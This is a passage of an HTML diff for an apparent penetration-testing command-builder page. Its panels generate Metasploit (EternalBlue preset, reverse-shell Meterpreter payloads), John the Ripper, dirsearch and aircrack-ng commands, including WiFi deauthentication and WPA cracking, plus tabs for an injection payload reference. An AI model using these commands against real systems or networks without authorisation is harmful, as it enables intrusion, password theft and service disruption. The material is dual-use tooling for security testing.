+        <div class="tool-name">METASPLOIT</div>
+        <div class="tool-desc">World's most used penetration testing framework. Exploit development, payload generation, post-exploitation and more.</div>
+        <div class="tool-tag">EXPLOITATION FRAMEWORK</div>
+      </div>
+    </div>
+
+    <div class="presets">
+      <button class="preset-btn" onclick="loadPreset('msf','eternalblue')">EternalBlue (MS17-010)</button>
+      <button class="preset-btn" onclick="loadPreset('msf','meterpreter')">Meterpreter Shell</button>
+      <button class="preset-btn" onclick="loadPreset('msf','handler')">Multi Handler</button>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Exploit Path</label>
+        <input type="text" id="msf-exploit" placeholder="exploit/windows/smb/ms17_010_eternalblue" oninput="buildMsf()">
+      </div>
+      <div class="field">
+        <label>Payload</label>
+        <select id="msf-payload" onchange="buildMsf()">
+          <option value="">None / Module Default</option>
+          <option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option>
+          <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
+          <option value="linux/x64/shell/reverse_tcp">linux/x64/shell/reverse_tcp</option>
+          <option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option>
+          <option value="java/meterpreter/reverse_tcp">java/meterpreter/reverse_tcp</option>
+          <option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option>
+          <option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>RHOST (Target IP)</label>
+        <input type="text" id="msf-rhost" placeholder="192.168.1.100" oninput="buildMsf()">
+      </div>
+      <div class="field">
+        <label>RPORT</label>
+        <input type="number" id="msf-rport" placeholder="445" oninput="buildMsf()">
+      </div>
+      <div class="field">
+        <label>LHOST (Your IP)</label>
+        <input type="text" id="msf-lhost" placeholder="10.0.0.1" oninput="buildMsf()">
+      </div>
+      <div class="field">
+        <label>LPORT</label>
+        <input type="number" id="msf-lport" placeholder="4444" oninput="buildMsf()">
+      </div>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">MSFCONSOLE SCRIPT</div>
+      <div class="output-box" id="msf-output" style="white-space:pre"><span class="prompt">msf6></span> <span style="color:var(--muted)"># fill fields to generate</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('msf-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('metasploit')">✕ RESET</button>
+        <span class="copy-feedback" id="msf-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ JOHN ══════════════ -->
+  <div id="panel-john" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">🔐</div>
+      <div>
+        <div class="tool-name">JOHN THE RIPPER</div>
+        <div class="tool-desc">Fast password cracker supporting hundreds of hash types. CPU+GPU acceleration, wordlist and incremental modes.</div>
+        <div class="tool-tag">PASSWORD CRACKING</div>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Hash File *</label>
+        <input type="text" id="john-file" placeholder="hash.txt" oninput="buildJohn()">
+      </div>
+      <div class="field">
+        <label>Hash Format</label>
+        <select id="john-format" onchange="buildJohn()">
+          <option value="">Auto-detect</option>
+          <option value="--format=md5">MD5</option>
+          <option value="--format=sha1">SHA1</option>
+          <option value="--format=sha256">SHA256</option>
+          <option value="--format=bcrypt">bcrypt</option>
+          <option value="--format=NT">NTLM (Windows)</option>
+          <option value="--format=md5crypt">md5crypt (Linux)</option>
+          <option value="--format=sha512crypt">sha512crypt (Linux)</option>
+          <option value="--format=zip">ZIP password</option>
+          <option value="--format=rar">RAR password</option>
+          <option value="--format=pdf">PDF password</option>
+          <option value="--format=ssh">SSH key passphrase</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Wordlist</label>
+        <input type="text" id="john-wordlist" placeholder="/usr/share/wordlists/rockyou.txt" oninput="buildJohn()">
+      </div>
+      <div class="field">
+        <label>Rules</label>
+        <select id="john-rules" onchange="buildJohn()">
+          <option value="">None</option>
+          <option value="--rules=Single">Single</option>
+          <option value="--rules=Wordlist">Wordlist</option>
+          <option value="--rules=Extra">Extra</option>
+          <option value="--rules=Jumbo">Jumbo</option>
+          <option value="--rules=KoreLogic">KoreLogic</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Incremental Mode</label>
+        <select id="john-inc" onchange="buildJohn()">
+          <option value="">None</option>
+          <option value="--incremental=All">All (Full brute)</option>
+          <option value="--incremental=Digits">Digits only</option>
+          <option value="--incremental=Alpha">Alpha only</option>
+          <option value="--incremental=ASCII">Full ASCII</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Min/Max Length</label>
+        <input type="text" id="john-minmax" placeholder="--min-length=6 --max-length=12" oninput="buildJohn()">
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="john-show" onchange="buildJohn()"> --show (show cracked)</label>
+      <label class="check-item"><input type="checkbox" id="john-pot" onchange="buildJohn()"> --pot=john.pot</label>
+      <label class="check-item"><input type="checkbox" id="john-fork" onchange="buildJohn()"> --fork=4 (multi-CPU)</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="john-output"><span class="prompt">$</span> john <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('john-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('john')">✕ RESET</button>
+        <span class="copy-feedback" id="john-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ DIRSEARCH ══════════════ -->
+  <div id="panel-dirsearch" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">📂</div>
+      <div>
+        <div class="tool-name">DIRSEARCH</div>
+        <div class="tool-desc">Advanced web path scanner with smart wordlist, recursive scanning, multiple extensions and proxy support.</div>
+        <div class="tool-tag">DIRECTORY SCANNING</div>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field">
+        <label>Target URL *</label>
+        <input type="text" id="ds-url" placeholder="http://target.com" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Extensions</label>
+        <input type="text" id="ds-ext" placeholder="php,html,js,txt,bak,zip" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Wordlist</label>
+        <input type="text" id="ds-wordlist" placeholder="/usr/lib/python3/dist-packages/dirsearch/db/dicc.txt" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Threads</label>
+        <input type="number" id="ds-threads" placeholder="30" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Exclude Status</label>
+        <input type="text" id="ds-exclude" placeholder="404,400" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Proxy</label>
+        <input type="text" id="ds-proxy" placeholder="http://127.0.0.1:8080" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Output File</label>
+        <input type="text" id="ds-out" placeholder="report.txt" oninput="buildDirsearch()">
+      </div>
+      <div class="field">
+        <label>Delay (sec)</label>
+        <input type="text" id="ds-delay" placeholder="0.5" oninput="buildDirsearch()">
+      </div>
+    </div>
+
+    <div class="section-label">FLAGS</div>
+    <div class="check-group">
+      <label class="check-item"><input type="checkbox" id="ds-r" onchange="buildDirsearch()"> -r (recursive)</label>
+      <label class="check-item"><input type="checkbox" id="ds-R" onchange="buildDirsearch()"> --deep-recursive</label>
+      <label class="check-item"><input type="checkbox" id="ds-F" onchange="buildDirsearch()"> -F (follow redirects)</label>
+      <label class="check-item"><input type="checkbox" id="ds-q" onchange="buildDirsearch()"> -q (quiet)</label>
+      <label class="check-item"><input type="checkbox" id="ds-random-ua" onchange="buildDirsearch()"> --random-agent</label>
+    </div>
+
+    <div class="output-section">
+      <div class="output-label">GENERATED COMMAND</div>
+      <div class="output-box" id="ds-output"><span class="prompt">$</span> python3 dirsearch.py <span style="color:var(--muted)"># fill fields above</span></div>
+      <div class="btn-row">
+        <button class="btn success" onclick="copyCmd('ds-output')">⎘ COPY</button>
+        <button class="btn danger" onclick="resetPanel('dirsearch')">✕ RESET</button>
+        <span class="copy-feedback" id="ds-copied">COPIED!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ AIRCRACK ══════════════ -->
+  <div id="panel-aircrack" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">📶</div>
+      <div>
+        <div class="tool-name">AIRCRACK-NG SUITE</div>
+        <div class="tool-desc">Complete suite for WiFi network security auditing. Includes monitoring, capturing, attacking and cracking WEP/WPA keys.</div>
+        <div class="tool-tag">WIFI SECURITY AUDIT</div>
+      </div>
+    </div>
+
+    <div class="inner-tabs">
+      <button class="inner-tab active" onclick="switchInnerTab('air','monitor')">MONITOR MODE</button>
+      <button class="inner-tab" onclick="switchInnerTab('air','capture')">CAPTURE</button>
+      <button class="inner-tab" onclick="switchInnerTab('air','deauth')">DEAUTH</button>
+      <button class="inner-tab" onclick="switchInnerTab('air','crack')">CRACK</button>
+    </div>
+
+    <div id="air-tab-monitor" class="inner-tab-content active">
+      <div class="form-grid">
+        <div class="field">
+          <label>Interface *</label>
+          <input type="text" id="air-mon-iface" placeholder="wlan0" oninput="buildAirmon()">
+        </div>
+        <div class="field">
+          <label>Channel</label>
+          <input type="number" id="air-mon-channel" placeholder="6" min="1" max="13" oninput="buildAirmon()">
+        </div>
+      </div>
+      <div class="output-section">
+        <div class="output-label">ENABLE MONITOR MODE</div>
+        <div class="output-box" id="air-mon-start"><span class="prompt">$</span> airmon-ng start wlan0</div>
+        <div class="output-label" style="margin-top:12px">KILL CONFLICTING PROCESSES</div>
+        <div class="output-box" id="air-mon-kill"><span class="prompt">$</span> airmon-ng check kill</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('air-mon-start')">⎘ COPY START</button>
+          <button class="btn" onclick="copyCmd('air-mon-kill')">⎘ COPY KILL</button>
+          <span class="copy-feedback" id="air-mon-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="air-tab-capture" class="inner-tab-content">
+      <div class="form-grid">
+        <div class="field">
+          <label>Monitor Interface *</label>
+          <input type="text" id="air-cap-iface" placeholder="wlan0mon" oninput="buildAircap()">
+        </div>
+        <div class="field">
+          <label>Target BSSID</label>
+          <input type="text" id="air-cap-bssid" placeholder="AA:BB:CC:DD:EE:FF" oninput="buildAircap()">
+        </div>
+        <div class="field">
+          <label>Channel</label>
+          <input type="number" id="air-cap-channel" placeholder="6" oninput="buildAircap()">
+        </div>
+        <div class="field">
+          <label>Output Name</label>
+          <input type="text" id="air-cap-out" placeholder="capture" oninput="buildAircap()">
+        </div>
+      </div>
+      <div class="output-section">
+        <div class="output-label">AIRODUMP COMMAND</div>
+        <div class="output-box" id="air-cap-output"><span class="prompt">$</span> airodump-ng wlan0mon</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('air-cap-output')">⎘ COPY</button>
+          <span class="copy-feedback" id="air-cap-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="air-tab-deauth" class="inner-tab-content">
+      <div class="form-grid">
+        <div class="field">
+          <label>Monitor Interface *</label>
+          <input type="text" id="air-de-iface" placeholder="wlan0mon" oninput="buildAireplay()">
+        </div>
+        <div class="field">
+          <label>Target AP BSSID *</label>
+          <input type="text" id="air-de-bssid" placeholder="AA:BB:CC:DD:EE:FF" oninput="buildAireplay()">
+        </div>
+        <div class="field">
+          <label>Client BSSID (optional)</label>
+          <input type="text" id="air-de-client" placeholder="FF:EE:DD:CC:BB:AA" oninput="buildAireplay()">
+        </div>
+        <div class="field">
+          <label>Deauth Count</label>
+          <input type="number" id="air-de-count" placeholder="10" oninput="buildAireplay()">
+        </div>
+      </div>
+      <div class="output-section">
+        <div class="output-label">AIREPLAY DEAUTH COMMAND</div>
+        <div class="output-box" id="air-de-output"><span class="prompt">$</span> aireplay-ng --deauth 10 -a [BSSID] wlan0mon</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('air-de-output')">⎘ COPY</button>
+          <span class="copy-feedback" id="air-de-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="air-tab-crack" class="inner-tab-content">
+      <div class="form-grid">
+        <div class="field">
+          <label>Capture File (.cap) *</label>
+          <input type="text" id="air-crack-cap" placeholder="capture-01.cap" oninput="buildAircrack()">
+        </div>
+        <div class="field">
+          <label>Wordlist</label>
+          <input type="text" id="air-crack-wl" placeholder="/usr/share/wordlists/rockyou.txt" oninput="buildAircrack()">
+        </div>
+        <div class="field">
+          <label>Target BSSID</label>
+          <input type="text" id="air-crack-bssid" placeholder="AA:BB:CC:DD:EE:FF" oninput="buildAircrack()">
+        </div>
+        <div class="field">
+          <label>Encryption</label>
+          <select id="air-crack-enc" onchange="buildAircrack()">
+            <option value="">WPA/WPA2 (auto)</option>
+            <option value="-K">-K (Korek WEP)</option>
+            <option value="-z">-z (PTW WEP)</option>
+          </select>
+        </div>
+      </div>
+      <div class="output-section">
+        <div class="output-label">AIRCRACK COMMAND</div>
+        <div class="output-box" id="air-crack-output"><span class="prompt">$</span> aircrack-ng capture-01.cap -w wordlist.txt</div>
+        <div class="btn-row">
+          <button class="btn success" onclick="copyCmd('air-crack-output')">⎘ COPY</button>
+          <span class="copy-feedback" id="air-crack-copied">COPIED!</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════ PAYLOAD GEN ══════════════ -->
+  <div id="panel-payload" class="tool-panel">
+    <div class="tool-header">
+      <div class="tool-icon">💣</div>
+      <div>
+        <div class="tool-name">PAYLOAD GENERATOR</div>
+        <div class="tool-desc">Quick reference for common attack payloads. XSS, SQL Injection, Command Injection, LFI, SSRF and more — for authorized testing.</div>
+        <div class="tool-tag">PAYLOAD REFERENCE</div>
+      </div>
+    </div>
+
+    <div class="inner-tabs">
+      <button class="inner-tab active" onclick="switchInnerTab('pay','xss')">XSS</button>
+      <button class="inner-tab" onclick="switchInnerTab('pay','sqli')">SQL INJECTION</button>
+      <button class="inner-tab" onclick="switchInnerTab('pay','cmdi')">CMD INJECTION</button>
+      <button class="inner-tab" onclick="switchInnerTab('pay','lfi')">LFI / PATH TRAVERSAL</button>
+      <button class="inner-tab" onclick="switchInnerTab('pay','ssrf')">SSRF</button>
+    </div>
+
+    <div id="pay-tab-xss" class="inner-tab-content active">
+      <div class="payload-list" id="xss-payloads"></div>
+    </div>
+    <div id="pay-tab-sqli" class="inner-tab-content">
+      <div class="payload-list" id="sqli-payloads"></div>
+    </div>
+    <div id="pay-tab-cmdi" class="inner-tab-content">
+      <div class="payload-list" id="cmdi-payloads"></div>
+    </div>
+    <div id="pay-tab-lfi" class="inner-tab-content">
+      <div class="payload-list" id="lfi-payloads"></div>
+    </div>
+    <div id="pay-tab-ssrf" class="inner-tab-content">
+      <div class="payload-list" id="ssrf-payloads"></div>
+    </div>
+  </div>
+
+</main>
+<div style="text-align: center; padding: 40px 0 20px 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 14px; color: #333; width: 100%; clear: both;">
+  Made with 
+  <img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/2764.png" alt="love" style="width: 16px; vertical-align: middle; margin: 0 3px;"> 
+  by 
+  <a href="https://github.com/ujjal-dev" target="_blank" style="color: #007bff; text-decoration: none; font-weight: bold;">
+      ujjal
+  </a>
+</div>
+
+<script src="script.js">
+</script>
+</body>
+</html>
